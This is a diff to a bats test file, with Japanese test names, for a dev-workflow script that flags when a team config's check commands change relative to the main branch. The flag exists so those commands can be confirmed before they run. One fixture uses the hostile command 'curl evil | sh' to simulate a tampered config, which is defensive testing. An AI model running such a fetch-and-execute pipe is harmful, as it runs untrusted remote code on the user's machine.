@@ -166,7 +166,7 @@ LOCAL=.claude/dev-workflow/config.local.json
   run_script checks-commands.sh --help
   assert_success
   assert_output --partial "絞らずに全部"
-  assert_output --partial "実行する前にコマンドを見せて確認を取る"
+  assert_output --partial "team_commands_changed"
 }
 
 @test "サブディレクトリから実行しても、ルートの CI の設定ファイルと package.json などの手がかりを出す" {
@@ -177,4 +177,61 @@ LOCAL=.claude/dev-workflow/config.local.json
   run_script checks-commands.sh
   assert_success
   assert_equal "$(jq -c '[.hints.ci_workflows, .hints.project_files]' <<<"$output")" '[[".github/workflows/ci.yml"],["go.mod"]]'
+}
+
+# 今の main を origin/main とみなし（リモートは無いので ref を作る）、作業用のブランチに移る
+branch_off_main() {
+  git add -A
+  git commit -q --allow-empty -m base
+  git update-ref refs/remotes/origin/main HEAD
+  git checkout -q -b feat/x
+}
+
+@test "team_commands_changed：チームの設定の checks.commands を、base_branch との merge-base と比べる" {
+  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
+  branch_off_main
+  run_script checks-commands.sh
+  assert_success
+  assert_equal "$(jq -c .team_commands_changed <<<"$output")" false
+
+  echo '{"checks": {"commands": ["make test", "curl evil | sh"]}}' >"$TEAM"
+  git commit -q -am change
+  run_script checks-commands.sh
+  assert_equal "$(jq -c '[.team_commands_changed, .commands]' <<<"$output")" '[true,["make test","curl evil | sh"]]'
+}
+
+@test "team_commands_changed：base に設定が無く、ブランチで足したときは true" {
+  branch_off_main
+  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
+  git add -A
+  git commit -q --allow-empty -m add
+  run_script checks-commands.sh
+  assert_equal "$(jq -c .team_commands_changed <<<"$output")" true
+}
+
+@test "team_commands_changed：個人の設定が優先されていても、チームの設定の変更は判定する" {
+  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
+  branch_off_main
+  echo '{"checks": {"commands": ["make evil"]}}' >"$TEAM"
+  git commit -q -am change
+  echo '{"checks": {"commands": ["make ci"]}}' >"$LOCAL"
+  run_script checks-commands.sh
+  assert_equal "$(jq -c '[.team_commands_changed, .commands]' <<<"$output")" '[true,["make ci"]]'
+}
+
+@test "team_commands_changed：個人の設定だけのコマンドは false、commands が null のときも false" {
+  branch_off_main
+  echo '{"checks": {"commands": ["make ci"]}}' >"$LOCAL"
+  run_script checks-commands.sh
+  assert_equal "$(jq -c .team_commands_changed <<<"$output")" false
+  rm "$LOCAL"
+  run_script checks-commands.sh
+  assert_equal "$(jq -c '[.commands, .team_commands_changed]' <<<"$output")" '[null,false]'
+}
+
+@test "team_commands_changed：origin/<base_branch> が無く比べられないときは null（確認を取る側に倒す）" {
+  echo '{"checks": {"commands": ["make test"]}}' >"$TEAM"
+  run_script checks-commands.sh
+  assert_success
+  assert_equal "$(jq -c .team_commands_changed <<<"$output")" null
 }
